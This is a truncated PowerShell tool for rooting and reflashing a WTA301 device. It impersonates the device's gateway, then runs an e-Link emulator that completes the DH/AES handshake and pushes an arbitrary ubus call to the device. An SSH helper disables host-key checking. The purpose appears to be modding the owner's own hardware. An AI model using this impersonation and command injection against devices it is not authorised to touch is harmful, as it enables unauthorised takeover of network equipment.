<#
.SYNOPSIS
    WTA301 一键工具 —— 纯 PowerShell 5.1（Windows 10 自带，不需要装 Python）

.DESCRIPTION
    一台电脑、一个目录、一个脚本搞定全部操作：
      1) 取 root（网线，不需要 scapy / 不需要设备 WiFi / 不需要中继模式）
      2) 刷 OpenWrt
      3) 刷回原厂
      4) 只刷 u-boot kit
      5) 安全审计（只读）
      6) 整片备份（4 路并行）
      7) 修 B 槽回退
      8) TTL 串口刷 u-boot（救砖）—— 能上网就不用它，[3] 就够了

    为什么用 ps1 而不是 py：目标机器是别人的 Windows，不能要求装 Python。
    PowerShell 5.1 是 Win10 LTSC 自带的，密码学（DH/AES）、TCP、串口全都能做，
    所以整个工具是单文件、零依赖。

.NOTES
    入口请走 启动.bat（会自动提权），不要直接双击本文件。
#>

[CmdletBinding()]
param(
    [string] $Target,
    [string] $PcIp,
    [int]    $Port = 2323,
    [switch] $Yes,
    [switch] $DryRun,
    [switch] $Keep,
    [string] $StockDir,
    [string] $BackupDir,
    [string] $TtlPort,
    [string] $Password,
    [string] $Kind,
    [switch] $SelfTest,
    [Parameter(ValueFromRemainingArguments = $true)]
    [string[]] $Rest
)

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$script:Here = Split-Path -Parent $MyInvocation.MyCommand.Path
$script:LogPath = Join-Path $script:Here ("wta301-{0}.log" -f (Get-Date -Format 'yyyyMMdd-HHmmss'))
$script:Nops = 0

# 控制台用 UTF-8，否则中文全是乱码
try {
    [Console]::OutputEncoding = [Text.Encoding]::UTF8
    chcp 65001 > $null
} catch { }

# ===========================================================================
# 常量 —— 全部来自板上实测，改之前先看 docs/ 里的证据
# ===========================================================================
$script:ELINK_PORT  = 32768
$script:SRV_PORT    = 8099
$script:NC_PORT     = 8100   # 备份端口段起点，必须避开 8099(HTTP) 与 32768(e-Link)
$script:NC_PARALLEL = 4      # 并行流数，见 Invoke-Backup 里的说明
$script:NC_PORT_END = $script:NC_PORT + $script:NC_PARALLEL - 1
$script:ELINK_MAGIC = 0x3F721FB5

# mtd 布局（唯一真源 = 板上 /sys/class/mtd/mtdN/offset）。
# 注意：原厂固件和我们的 OpenWrt 对同一块区域的命名互为主备，
# 所以绝不能按名字找分区，只能按偏移。见 Get-MtdTable。
$script:MtdAbs = @{
    0  = 0x0000000; 1  = 0x0400000; 2  = 0x0480000; 3  = 0x0500000
    4  = 0x0700000; 5  = 0x0880000; 6  = 0x0FC0000; 7  = 0x6A00000
    8  = 0x0800000; 9  = 0x4700000; 10 = 0x4880000; 11 = 0x4FC0000
    12 = 0x6A00000; 13 = 0x4800000; 14 = 0x4000000
}

# 永远不许写的分区：mtd0 是一级 u-boot（TTL 命脉），
# mtd1/mtd2 是出厂信息与射频校准（写坏不可恢复），
# mtd14 是 boot_flag（选槽依据）。
# ★★★ 门禁一律按【绝对偏移】判，绝不按 mtd 编号 ★★★
#   踩过的真 bug：按编号判的时候，写 A 槽内核（OpenWrt 下是 mtd5，0x4880000）
#   被当成「原厂下 mtd5 = B 槽内核」，报「mtd5 只允许 restore-bslot 写」。
#   同一个数字在两个固件里指两个完全不同的分区，按编号判必然出错。
# 键用 Format-Hex 出来的字符串（"0x4880000"）而不是十六进制字面量。
# 踩过的坑：PowerShell 里 @{ 0x4880000 = ... } 的键是 Int32，
# 而查找时传的是 Int64，装箱后 Int32 0x4880000 -ne Int64 0x4880000，
# ContainsKey 一律返回 false —— 门禁全部静默失效，自检才发现。
$script:HardDeny = @{
    '0x0'       = 'factory_boot 一级 u-boot（TTL 命脉）'
    '0x400000'  = 'factory_info 出厂信息'
    '0x480000'  = 'art 射频校准'
    '0x4000000' = 'boot_flag 选槽标志'
}

# 受保护区域：允许写，但必须显式走对应动作，不能顺手写
$script:Guarded = @{
    '0x700000'  = @('flash-uboot')                      # u-boot B 槽
    '0x4700000' = @('flash-uboot')                      # u-boot A 槽
    '0x880000'  = @('restore-bslot')                    # 内核 B 槽（原厂回退）
    '0xfc0000'  = @('restore-bslot')                    # rootfs B 槽（原厂回退）
    '0x4880000' = @('flash-op', 'flash-stock')          # 内核 A 槽（工作区）
    '0x4fc0000' = @('flash-op', 'flash-stock')          # rootfs A 槽（工作区）
}

$script:BackupSkip = @(15, 16)   # UBI 卷视图，不是独立区域

# ===========================================================================
# 后台服务的停止
#
# ★ 为什么用「State + 函数」而不是在 hashtable 里塞 { }：
#   PowerShell 的 scriptblock 不是词法闭包。在函数里定义、函数返回后再 & 调用，
#   它引用的局部变量（$listener / $http / $elink）已经随作用域销毁了，
#   于是 `& $null.Stop` 报「& 后面的表达式生成无效的对象」。
#   这个坑还连带害得清理代码整个没执行 —— 别名和防火墙都留在本机。
# ===========================================================================
function Stop-BackgroundService {
    param($State, [string]$Name = 'service')
    if (-not $State) { return }
    try { $State.Stop = $true } catch { }
    foreach ($f in @('Listener', 'Sock')) {
        if ($State.ContainsKey($f) -and $State[$f]) {
            try { $State[$f].Stop() } catch { }
        }
    }
    if ($State.ContainsKey('PS') -and $State.PS) {
        Start-Sleep -Milliseconds 120
        try { [void]$State.PS.EndInvoke($State.Handle) } catch { }
        try { $State.PS.Dispose() } catch { }
    }
    Write-Log "已停止 $Name"
}

# ===========================================================================
# 输出
# ===========================================================================

# 输出编码：只有 stdout 被重定向时（管道、`> file`、被别的程序调用）
# PowerShell 5.1 会用 [Console]::OutputEncoding（中文系统上是 GBK）去编码，
# 部分字符会变成 '?'，中文被截断。真实控制台窗口不走这条路（WriteConsoleW，
# 直接 Unicode），所以只在重定向时改成 UTF-8，两者都对。
try {
    if ([Console]::IsOutputRedirected) {
        [Console]::OutputEncoding = New-Object System.Text.UTF8Encoding $false
    }
} catch { }
function Write-Log {
    param([string]$Text, [string]$Level = 'INFO')
    $line = "[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $Text
    try { Add-Content -LiteralPath $script:LogPath -Value $line -Encoding UTF8 } catch { }
}

function Write-Step { param([string]$Text) Write-Host ""; Write-Host " $Text" -ForegroundColor Cyan; Write-Log $Text }
function Write-Info { param([string]$Text) Write-Host "   $Text"; Write-Log "  $Text" }
function Write-Ok   { param([string]$Text) Write-Host "   $Text" -ForegroundColor Green; Write-Log "OK $Text" }
function Write-Warn2{ param([string]$Text) Write-Host "   $Text" -ForegroundColor Yellow; Write-Log "WARN $Text" }
function Write-Err2 {
    param([string]$Text)
    Write-Host "   $Text" -ForegroundColor Red
    Write-Log "ERR $Text"
}

function Assert-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        throw "需要管理员权限（要改网卡地址和防火墙）。请用 启动.bat 启动，它会自动提权。"
    }
}

# ===========================================================================
# 本机网络身份
# ===========================================================================

# 找出哪个网卡持有指定 IP
function Get-IfIndexOfIp {
    param([string]$Ip)
    $a = Get-NetIPAddress -IPAddress $Ip -ErrorAction SilentlyContinue |
         Where-Object { $_.AddressFamily -eq 'IPv4' } | Select-Object -First 1
    if ($a) { return [int]$a.InterfaceIndex }
    return 0
}

# 猜本机与设备同网段的地址：取所有 IPv4 里和设备同 /24 的那个
function Find-PcIpFor {
    param([string]$DeviceIp)
    $net = ($DeviceIp -split '\.')[0..2] -join '.'
    $cand = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object {
                $_.IPAddress -ne '127.0.0.1' -and
                $_.PrefixOrigin -ne 'WellKnown' -and
                ($_.IPAddress -split '\.')[0..2] -join '.' -eq $net
            } | Select-Object -First 1
    if ($cand) { return $cand.IPAddress }
    return $null
}

<#
    冒充网关。
    原理（实测）：设备上的 elinkclt 会主动反连「网关地址:32768」。
    只要本机把那个地址当成自己的（/32 别名 + SkipAsSource），
    设备的回连就会打到我们这里来。不需要 ARP 毒化，不需要 scapy。

    SkipAsSource 是关键：不加它，Windows 会拿这个别名当源地址去发别的包，
    把本机网络搞坏（用户明确禁止过）。
#>
function Add-GatewayAlias {
    param([int]$IfIndex, [string[]]$Addrs)
    $added = @()
    foreach ($a in $Addrs) {
        try {
            $ex = Get-NetIPAddress -IPAddress $a -InterfaceIndex $IfIndex -ErrorAction SilentlyContinue
            if ($ex) { Write-Info "[1] 别名 $a 已在位（复用）"; continue }
            New-NetIPAddress -InterfaceIndex $IfIndex -IPAddress $a -PrefixLength 32 `
                             -SkipAsSource $true -ErrorAction Stop | Out-Null
            $added += $a
            Write-Info "+ 别名 $a/32 (SkipAsSource)"
        } catch {
            Write-Warn2 "! 别名 $a 加失败：$($_.Exception.Message)"
        }
    }
    return $added
}

function Remove-GatewayAlias {
    param([int]$IfIndex, [string[]]$Addrs)
    # 只删「/32 + SkipAsSource」的别名 —— 那是本工具加的假网关。
    # 真实网关是正常前缀的地址，不会被这条规则误删。
    foreach ($a in $Addrs) {
        $found = Get-NetIPAddress -IPAddress $a -ErrorAction SilentlyContinue |
                 Where-Object { $_.PrefixLength -eq 32 }
        if (-not $found) { continue }
        foreach ($f in $found) {
            try {
                Remove-NetIPAddress -IPAddress $a -PrefixLength 32 -Confirm:$false -ErrorAction Stop
                Write-Info "- 删除别名 $a/32"
            } catch {
                Write-Warn2 "- 别名 $a/32 删除失败：$($_.Exception.Message)"
            }
        }
    }
}

function Enable-FirewallPort {
    param([string]$Spec)
    $spec = $Spec
    try {
        netsh advfirewall firewall delete rule name=WTA301 > $null 2>&1
        netsh advfirewall firewall add rule name=WTA301 dir=in action=allow `
              protocol=TCP localport=$spec > $null 2>&1
        Write-Info "+ 防火墙放行 TCP $spec (WTA301)"
    } catch {
        Write-Warn2 "! 防火墙规则加失败：$($_.Exception.Message)"
    }
}

function Disable-FirewallPort {
    try {
        netsh advfirewall firewall delete rule name=WTA301 > $null 2>&1
        Write-Info "- 删除防火墙规则"
    } catch { }
}

# ===========================================================================
# HTTP 服务（设备用 wget 从我们这里取包）
#   等价于原来的 srv.py，但用 TcpListener 手写：
#   HttpListener 需要 http.sys 的 URL ACL，现场很容易踩权限坑。
# ===========================================================================
function Start-HttpServer {
    param([int]$ListenPort, [string]$Root, [scriptblock]$OnRequest)

    $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $ListenPort)
    $listener.Start()
    $state = @{ Stop = $false; Listener = $listener; Root = $Root; OnRequest = $OnRequest }
    $sb = {

        param($st)
        $l = $st.Listener
        while (-not $st.Stop) {
            try { $c = $l.AcceptTcpClient() } catch { break }
            try {
                $ns  = $c.GetStream()
                $ns.ReadTimeout = 5000
                $buf = New-Object byte[] 4096
                $n   = 0
                try { $n = $ns.Read($buf, 0, $buf.Length) } catch { $n = 0 }
                $req = [Text.Encoding]::ASCII.GetString($buf, 0, $n)
                $path = '/'
                if ($req -match '^GET\s+(\S+)') { $path = $Matches[1] }
                if ($st.OnRequest) { & $st.OnRequest $path $c.Client.RemoteEndPoint }

                $rel  = ($path -split '\?')[0].TrimStart('/')
                if ([string]::IsNullOrWhiteSpace($rel)) { $rel = 'index.html' }
                $rel  = $rel -replace '/', '\'
                $full = Join-Path $st.Root $rel
                $full = [IO.Path]::GetFullPath($full)
                if ((Test-Path -LiteralPath $full -PathType Leaf) -and
                    $full.StartsWith([IO.Path]::GetFullPath($st.Root), 'OrdinalIgnoreCase')) {
                    $bytes = [IO.File]::ReadAllBytes($full)
                    $hdr = "HTTP/1.0 200 OK`r`nContent-Length: $($bytes.Length)`r`n" +
                           "Content-Type: application/octet-stream`r`n`r`n"
                    $hb = [Text.Encoding]::ASCII.GetBytes($hdr)
                    $ns.Write($hb, 0, $hb.Length)
                    $ns.Write($bytes, 0, $bytes.Length)
                } else {
                    $body = [Text.Encoding]::ASCII.GetBytes("not found")
                    $hdr = "HTTP/1.0 404 Not Found`r`nContent-Length: $($body.Length)`r`n`r`n"
                    $hb = [Text.Encoding]::ASCII.GetBytes($hdr)
                    $ns.Write($hb, 0, $hb.Length)
                    $ns.Write($body, 0, $body.Length)
                }
                $ns.Flush(); $ns.Close()
            } catch { }
            finally { try { $c.Close() } catch { } }
        }
        try { $l.Stop() } catch { }
    }
    $ps = [PowerShell]::Create()
    [void]$ps.AddScript($sb.ToString()).AddArgument($state)
    $handle = $ps.BeginInvoke()
    Write-Info "+ HTTP 服务 :$ListenPort  根目录 $Root"
    $state.PS = $ps; $state.Handle = $handle
    return $state
}

# ===========================================================================
# e-Link 网关模拟器（等价 elink_gw4.py）
#   帧格式: MAGIC(4, 大端) + len(4, 大端) + body
#   握手:   keyngreq -> keyngack ; dh -> dh（DH128，取共享密钥低 16 字节做 AES-128 key）
#   加密:   AES-128-CBC，IV 全零，无填充（靠 JSON 尾部的 \0 对齐）
# ===========================================================================
function Read-Exact {
    param($Stream, [int]$Count)
    $b = New-Object byte[] $Count
    $off = 0
    while ($off -lt $Count) {
        $r = $Stream.Read($b, $off, $Count - $off)
        if ($r -le 0) { return $null }
        $off += $r
    }
    return $b
}

function Read-Frame {
    param($Stream)
    $h = Read-Exact -Stream $Stream -Count 8
    if (-not $h) { return $null }
    $magic = ([uint32]$h[0] -shl 24) -bor ([uint32]$h[1] -shl 16) -bor ([uint32]$h[2] -shl 8) -bor [uint32]$h[3]
    $len   = ([uint32]$h[4] -shl 24) -bor ([uint32]$h[5] -shl 16) -bor ([uint32]$h[6] -shl 8) -bor [uint32]$h[7]
    if ($magic -ne $script:ELINK_MAGIC) { return $null }
    if ($len -le 0 -or $len -gt 1048576) { return $null }
    return Read-Exact -Stream $Stream -Count $len
}

function Send-Frame {
    param($Stream, [byte[]]$Body)
    $h = New-Object byte[] 8
    $h[0] = [byte](($script:ELINK_MAGIC -shr 24) -band 0xFF)
    $h[1] = [byte](($script:ELINK_MAGIC -shr 16) -band 0xFF)
    $h[2] = [byte](($script:ELINK_MAGIC -shr 8)  -band 0xFF)
    $h[3] = [byte]($script:ELINK_MAGIC -band 0xFF)
    $l = $Body.Length
    $h[4] = [byte](($l -shr 24) -band 0xFF)
    $h[5] = [byte](($l -shr 16) -band 0xFF)
    $h[6] = [byte](($l -shr 8)  -band 0xFF)
    $h[7] = [byte]($l -band 0xFF)
    $Stream.Write($h, 0, 8)
    $Stream.Write($Body, 0, $Body.Length)
    $Stream.Flush()
}

function New-AesPair {
    param([byte[]]$Key)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode    = 'CBC'
    $aes.Padding = 'None'
    $aes.Key     = $Key
    $aes.IV      = New-Object byte[] 16
    return $aes
}

function Protect-Aes {
    param([byte[]]$Key, [byte[]]$Data)
    $aes = New-AesPair -Key $Key
    $d = $Data
    $pad = 16 - ($d.Length % 16)
    if ($pad -ne 16) {
        $tmp = New-Object byte[] ($d.Length + $pad)
        [Array]::Copy($d, $tmp, $d.Length)
        $d = $tmp
    }
    $e = $aes.CreateEncryptor()
    return $e.TransformFinalBlock($d, 0, $d.Length)
}

function Unprotect-Aes {
    param([byte[]]$Key, [byte[]]$Data)
    $aes = New-AesPair -Key $Key
    $d = $Data
    if ($d.Length % 16 -ne 0) {
        $keep = $d.Length - ($d.Length % 16)
        $d = $d[0..($keep - 1)]
    }
    $e = $aes.CreateDecryptor()
    return $e.TransformFinalBlock($d, 0, $d.Length)
}

# 把大整数转成定长大端字节数组
function ConvertTo-BigEndianBytes {
    param($Value, [int]$Length)
    $raw = $Value.ToByteArray()          # .NET 是小端
    [Array]::Reverse($raw)
    if ($raw.Length -gt $Length) {
        $raw = $raw[($raw.Length - $Length)..($raw.Length - 1)]
    }
    $out = New-Object byte[] $Length
    $src = $raw.Length
    for ($i = 0; $i -lt $src; $i++) { $out[$Length - $src + $i] = $raw[$i] }
    return $out
}

function Start-ElinkServer {
    param([int]$ListenPort, [string]$UbusObject, [string]$UbusMethod, [string]$UbusMessage)

    # DH 群参数由设备发给我们（dh_p / dh_g），我们只需算 ModPow
    $cmdMsg = @{}
    if ($UbusMessage) {
        try { $cmdMsg = $UbusMessage | ConvertFrom-Json -ErrorAction Stop } catch { $cmdMsg = @{} }
    }
    $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $ListenPort)
    $listener.Server.SetSocketOption('Socket', 'ReuseAddress', $true)
    $listener.Start()

    $state = [hashtable]::Synchronized(@{
        Stop = $false; Listener = $listener; Log = $script:LogPath
        Obj = $UbusObject; Meth = $UbusMethod; Msg = $cmdMsg
        GotResult = $null; Hits = 0
    })

    $sb = {
        param($st, $magic)

        function L { param($t) try { Add-Content -LiteralPath $st.Log -Value ("[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $t) -Encoding UTF8 } catch { } }
        function REx {
            param($s, $n)
            $b = New-Object byte[] $n; $o = 0
            while ($o -lt $n) {
                $r = $s.Read($b, $o, $n - $o)
                if ($r -le 0) { return $null }
                $o += $r
            }
            return $b
        }
        function RF {
            param($s)
            $h = REx $s 8
            if (-not $h) { return $null }
            $m = ([uint32]$h[0] -shl 24) -bor ([uint32]$h[1] -shl 16) -bor ([uint32]$h[2] -shl 8) -bor [uint32]$h[3]
            $n = ([uint32]$h[4] -shl 24) -bor ([uint32]$h[5] -shl 16) -bor ([uint32]$h[6] -shl 8) -bor [uint32]$h[7]
            if ($m -ne $magic -or $n -le 0 -or $n -gt 1048576) { return $null }
            return REx $s $n
        }
        function SF {
            param($s, [byte[]]$body)
            $h = New-Object byte[] 8
            $h[0] = [byte](($magic -shr 24) -band 0xFF); $h[1] = [byte](($magic -shr 16) -band 0xFF)
            $h[2] = [byte](($magic -shr 8) -band 0xFF);  $h[3] = [byte]($magic -band 0xFF)
            $n = $body.Length
            $h[4] = [byte](($n -shr 24) -band 0xFF); $h[5] = [byte](($n -shr 16) -band 0xFF)
            $h[6] = [byte](($n -shr 8) -band 0xFF);  $h[7] = [byte]($n -band 0xFF)
            $s.Write($h, 0, 8); $s.Write($body, 0, $body.Length); $s.Flush()
        }
        function B2I {
            param([byte[]]$be)
            $le = [byte[]]($be.Clone()); [Array]::Reverse($le)
            return [System.Numerics.BigInteger]::new([byte[]]($le + [byte[]](0)))
        }
        function I2B {
            param($v, [int]$len)
            $raw = $v.ToByteArray(); [Array]::Reverse($raw)
            if ($raw.Length -gt $len) { $raw = $raw[($raw.Length - $len)..($raw.Length - 1)] }
            $out = New-Object byte[] $len
            $src = $raw.Length
            for ($i = 0; $i -lt $src; $i++) { $out[$len - $src + $i] = $raw[$i] }
            return $out
        }

        while (-not $st.Stop) {
            try { $c = $st.Listener.AcceptTcpClient() } catch { break }
            $st.Hits++
            $s = $c.GetStream(); $s.ReadTimeout = 120000; $s.WriteTimeout = 60000
            L "=== accept from $($c.Client.RemoteEndPoint)"
            $aesKey = $null
            try {
                while ($true) {
                    $body = RF $s
                    if (-not $body) { L '--- closed'; break }
                    $plain = $body
                    if ($aesKey) {
                        try {
                            $a = [System.Security.Cryptography.Aes]::Create()
                            $a.Mode = 'CBC'; $a.Padding = 'None'; $a.Key = $aesKey; $a.IV = New-Object byte[] 16
                            $dd = $a.CreateDecryptor()
                            $plain = $dd.TransformFinalBlock($body, 0, ($body.Length - ($body.Length % 16)))
                        } catch { L "!! decrypt fail"; break }
                    }
                    $txt = [Text.Encoding]::UTF8.GetString($plain).Trim([char]0)
                    L "<<< " + $txt.Substring(0, [Math]::Min(600, $txt.Length))
                    $j = $null
                    try { $j = $txt | ConvertFrom-Json -ErrorAction Stop } catch { L '   (padding tail)'; continue }
                    $t    = $j.type
                    $seq  = if ($j.sequence) { [int]$j.sequence } else { 0 }
                    $mac  = if ($j.mac) { [string]$j.mac } else { '' }

                    if ($t -eq 'keyngreq') {
                        $r = @{ type='keyngack'; sequence=$seq; mac=$mac; keymode='dh'; data=@{ keymode='dh' } } |
                             ConvertTo-Json -Compress -Depth 5
                        SF $s ([Text.Encoding]::UTF8.GetBytes($r))
                        L '>>> keyngack'
                    }
                    elseif ($t -eq 'dh') {
                        $d  = $j.data
                        $pc = B2I ([Convert]::FromBase64String($d.dh_key))
                        $p  = B2I ([Convert]::FromBase64String($d.dh_p))
                        $g  = B2I ([Convert]::FromBase64String($d.dh_g))
                        $plen = ($p.ToByteArray().Length - 1)
                        $rnd = [System.Security.Cryptography.RandomNumberGenerator]::Create()
                        $ok = $false
                        for ($try = 0; $try -lt 400; $try++) {
                            # 私钥取 64 字节随机
                            $kb = New-Object byte[] 64; $rnd.GetBytes($kb)
                            $priv = B2I $kb
                            $pub  = [System.Numerics.BigInteger]::ModPow($g, $priv, $p)
                            $sh   = [System.Numerics.BigInteger]::ModPow($pc, $priv, $p)
                            $shb  = I2B $sh $plen
                            # 去掉前导零，取低 16 字节（设备端就是按这个长度校验的）
                            $i = 0; while ($i -lt $shb.Length -and $shb[$i] -eq 0) { $i++ }
                            $trim = if ($i -ge $shb.Length) { New-Object byte[] 0 } else { $shb[$i..($shb.Length-1)] }
                            if ($trim.Length -eq 16) { $aesKey = $trim; $ok = $true; break }
                        }
                        if (-not $ok) { L '!! 找不到 16 字节共享密钥'; break }
                        L ('    AES ' + (($aesKey | ForEach-Object { $_.ToString('x2') }) -join ''))
                        $rr = @{ type='dh'; sequence=$seq; mac=$mac;
                                 data=@{ dh_key=[Convert]::ToBase64String((I2B $pub $plen));
                                         dh_p=$d.dh_p; dh_g=$d.dh_g } } |
                              ConvertTo-Json -Compress -Depth 5
                        SF $s ([Text.Encoding]::UTF8.GetBytes($rr))
                        L '>>> dh ack'
                    }
                    elseif ($t -eq 'dev_reg') {
                        if ($st.Obj -and $aesKey) {
                            Start-Sleep -Milliseconds 300
                            $payload = @{ type='ubus_call'; sequence=($seq+1); mac=$mac;
                                          data=@( @{ object=$st.Obj; method=$st.Meth; message=$st.Msg } ) } |
                                       ConvertTo-Json -Compress -Depth 8
                            $pb = [Text.Encoding]::UTF8.GetBytes($payload)
                            $padn = 16 - ($pb.Length % 16)
                            if ($padn -ne 16) { $pb = $pb + (New-Object byte[] $padn) }
                            $a = [System.Security.Cryptography.Aes]::Create()
                            $a.Mode='CBC'; $a.Padding='None'; $a.Key=$aesKey; $a.IV=New-Object byte[] 16
                            $e = $a.CreateEncryptor()
                            $ct = $e.TransformFinalBlock($pb, 0, $pb.Length)
                            SF $s $ct
                            L ('>>> ubus_call ' + $st.Obj + '.' + $st.Meth)
                        }
                    }
                    elseif ($t -eq 'ubus_call') {
                        $res = ($j.data | ConvertTo-Json -Compress -Depth 8)
                        $st.GotResult = $res
                        L ('*** ubus 结果: ' + $res.Substring(0, [Math]::Min(1200, $res.Length)))
                    }
                    elseif ($t -eq 'keepalive') { }
                    else {
                        $r = @{ type='ack'; sequence=$seq; mac=$mac; data=@{} } | ConvertTo-Json -Compress -Depth 5
                        SF $s ([Text.Encoding]::UTF8.GetBytes($r))
                    }
                }
            } catch {
                L ("!! exc " + $_.Exception.GetType().Name + ' ' + $_.Exception.Message)
            } finally {
                try { $s.Close(); $c.Close() } catch { }
            }
        }
        try { $st.Listener.Stop() } catch { }
    }
    # AddScript 只接受字符串脚本，参数必须用 AddArgument 依次追加
    $ps = [PowerShell]::Create()
    [void]$ps.AddScript($sb.ToString()).AddArgument($state).AddArgument($script:ELINK_MAGIC)

    $handle = $ps.BeginInvoke()
    Write-Info "+ e-Link 模拟器 :$ListenPort"
    $state.PS = $ps; $state.Handle = $handle
    return $state
}

# ===========================================================================
# telnet 客户端
#   设备上的 telnetd 回显我们发的整行命令，而且【不折行】（实测）。
#   所以等命令结束不能靠固定 sleep，要挂一个哨兵：
#       { <cmd> ; } 2>&1; echo <tag>$?
#   哨兵必须「独占行首 + 紧跟数字」，否则回显里含 tag 会立刻误命中。
# ===========================================================================
# ===========================================================================
# SSH 会话（OpenWrt 用这条路）
#
# OpenWrt 本来就有 root，不需要 getroot —— 用户输密码就能进。
# 原厂固件反过来：没 SSH、也没有能用的密码，只能靠 getroot 打进去。
#
# 实现上不自建 SSH 客户端（PowerShell 里实现 DH+AES 的 SSH 握手太重），
# 直接调 Windows 10/11 自带的 OpenSSH（System32\OpenSSH\ssh.exe）。
# 密码通过 SSH_ASKPASS 喂进去（OpenSSH 8.4+ 的 SSH_ASKPASS_REQUIRE=force），
# 因为 ssh.exe 是直接读控制台，管道喂 stdin 不可靠。
# ===========================================================================

function Get-SshExe {
    $c = @(
        "$env:SystemRoot\System32\OpenSSH\ssh.exe",
        "$env:SystemRoot\Sysnative\OpenSSH\ssh.exe"
    )
    foreach ($p in $c) { if (Test-Path -LiteralPath $p) { return $p } }
    throw "找不到 Windows 自带的 ssh.exe（$env:SystemRoot\System32\OpenSSH\ssh.exe）。"
}

function New-AskpassFile {
    # 造一个只输出密码的小 .cmd，给 ssh 用。
    # 放在用户临时目录，用完立刻删（Send-FileToDevice 那套别把密码留在盘上）。
    param([string]$Password)
    $dir = Join-Path $env:TEMP ("wta301ap_" + [guid]::NewGuid().ToString('N').Substring(0, 8))
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
    $f = Join-Path $dir 'ap.cmd'
    # 密码里的特殊字符在 cmd 里要转义
    $esc = $Password -replace '([\^&|<>%])', '^$1'
    Set-Content -LiteralPath $f -Value ("@echo " + $esc) -Encoding ASCII
    return $f
}

function Open-SshSession {
    param([string]$Ip, [string]$User = 'root', [string]$Password,
          [string]$SshExe)

    if (-not $SshExe) { $SshExe = Get-SshExe }
    if (-not $Password) { throw "没有密码。OpenWrt 的 root 密码必须由用户提供，工具不猜。" }

    $ask = New-AskpassFile -Password $Password
    $oldAsk = $env:SSH_ASKPASS
    $oldReq = $env:SSH_ASKPASS_REQUIRE
    $oldDis = $env:DISPLAY
    $env:SSH_ASKPASS = $ask
    $env:SSH_ASKPASS_REQUIRE = 'force'
    $env:DISPLAY = 'localhost:0'
    try {
        $sess = @{
            Kind = 'ssh'; Ip = $Ip; User = $User; SshExe = $SshExe
            Ask = $ask; Alive = $true
        }
        $r = Invoke-SshRaw -Sess $sess -Script 'echo __SSH_OK__; uname -r' -TimeoutSec 40
        if ($r -notmatch '__SSH_OK__') { throw "SSH 登录失败（密码不对？）：$r" }
        return $sess
    } catch {
        Remove-Item -LiteralPath (Split-Path $ask -Parent) -Recurse -Force -ErrorAction SilentlyContinue
        throw
    } finally {
        # 这几条环境变量在 ssh 子进程里已经被读走了，退出前还原
        $env:SSH_ASKPASS = $oldAsk
        $env:SSH_ASKPASS_REQUIRE = $oldReq
        $env:DISPLAY = $oldDis
    }
}

function Invoke-SshRaw {
    <#
        跑一条 SSH 命令，返回它的 stdout。

        关键点（全部实测过，改了会坏）：
        1) 脚本走 `< 文件`，不要 `type 文件 | ssh`。
           管道会让 ssh 的 stdin 变成管道，它就回去读控制台等密码，卡到超时。
           `< 文件` 是真正的 stdin 重定向，ssh 老实读脚本，SSH_ASKPASS 正常工作。
        2) 脚本必须 LF，不能 CRLF。CRLF 会让远端把 \r 当参数一部分
           （uname -r 报 unrecognized option）。
        3) 命令不要拼成 `ssh host "命令"`。cmd.exe 不认 \" 转义，
           双引号会被 cmd 吃掉一半，远端收到半条命令
           （ash: syntax error: unexpected end of file）。
    #>
    param($Sess, [string]$Script, [int]$TimeoutSec = 60)

    $id = [guid]::NewGuid().ToString('N').Substring(0, 8)
    $shF = Join-Path $env:TEMP "wta301_$id.sh"
    $baF = Join-Path $env:TEMP "wta301_$id.bat"
    $ouF = Join-Path $env:TEMP "wta301_$id.out"
    $erF = Join-Path $env:TEMP "wta301_$id.err"

    $body = (($Script -replace "`r`n", "`n") -replace "`r", "`n") + "`n"
    [IO.File]::WriteAllText($shF, $body, (New-Object Text.UTF8Encoding $false))

    $remote = ("{0}@{1}" -f $Sess.User, $Sess.Ip)
    $bat = @(
        '@echo off'
        ('set "SSH_ASKPASS=' + $Sess.Ask + '"')
        'set "SSH_ASKPASS_REQUIRE=force"'
        'set "DISPLAY=localhost:0"'
        ('"' + $Sess.SshExe + '" -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL ' +
         '-o LogLevel=ERROR -o PubkeyAuthentication=no ' +
         '-o PreferredAuthentications=password,keyboard-interactive ' +
         '-o NumberOfPasswordPrompts=1 -o ConnectTimeout=10 ' +
         $remote + ' sh -s < "' + $shF + '" > "' + $ouF + '" 2> "' + $erF + '"')
        'exit /b %ERRORLEVEL%'
    )
    [IO.File]::WriteAllLines($baF, $bat, (New-Object Text.UTF8Encoding $false))

    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName  = (Join-Path $env:SystemRoot 'System32\cmd.exe')
        $psi.Arguments = ('/c "' + $baF + '"')
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $pr = [System.Diagnostics.Process]::Start($psi)
        if (-not $pr.WaitForExit($TimeoutSec * 1000)) {
            try { $pr.Kill() } catch { }
            throw ("SSH 命令超时（{0}s）" -f $TimeoutSec)
        }
        $code = $pr.ExitCode
        $so = ''
        $se = ''
        if (Test-Path -LiteralPath $ouF) { $so = [IO.File]::ReadAllText($ouF) }
        if (Test-Path -LiteralPath $erF) { $se = [IO.File]::ReadAllText($erF) }
        if ($code -ne 0) {
            $m = (($se + "`n" + $so).Trim())
            if ($m -match 'Permission denied|Authentication failed') { throw "SSH 密码不对" }
            throw ("SSH 失败（exit {0}）：{1}" -f $code, $m)
        }
        return ($so -replace "`r", '')
    } finally {
        foreach ($f in @($shF, $baF, $ouF, $erF)) {
            Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
        }
    }
}

function Enable-ShellChannel {
    <#
        OpenWrt 的入口是 SSH（有密码）。为了复用原厂那条已经调通的 telnet 通道，
        先试着把 telnetd 拉起来。

        但实测这块板的 OpenWrt（busybox 1.37）**没有 telnetd applet**
        （`busybox telnetd` -> applet not found），nc 也只有客户端模式。
